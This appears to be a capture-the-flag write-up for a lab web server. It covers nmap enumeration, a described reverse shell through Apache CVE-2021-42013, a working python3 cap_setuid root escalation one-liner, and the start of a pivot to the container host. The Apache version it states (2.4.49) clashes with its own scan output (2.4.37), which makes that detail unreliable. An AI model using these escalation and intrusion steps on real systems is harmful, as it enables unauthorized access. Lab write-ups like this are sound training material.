# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx ohmywebserver.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV ohmywebserver.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
Service Info: OS: Unix
```

# HTTP (port 80)
by exploring the website and doing a feroxbuster, we found nothing interesting\
but if we look at the apache version, it's 2.4.49 : it's vulnerable to a remote command execution (CVE-2021-42013)\

so we use a script to first curl and get a shell.py reverse shell in /tmp and then execute the script
```
daemon@4a70924bafa0:/bin$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
so we are daemon\
if we look at capabilities, we found out there is a capability on python3 to set a uid
```
daemon@4a70924bafa0:/bin$ getcap / -r 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/bin$
```

let's exploit it with the following command
```
daemon@4a70924bafa0:/bin$ python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
root@4a70924bafa0:/bin#
```

now we are root, there is a user.txt in /root/user.txt\
we see we are at the ip 172.17.0.2 so seems the host is under 172.17.0.1; let's try to nmap it by curl a nmap amd64 to the victim machine\
\
here is the result of the nmap on 172.17.0.1
```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:33:47:99:50 (Unknown)
```

let's try to exploit the open port here 5986
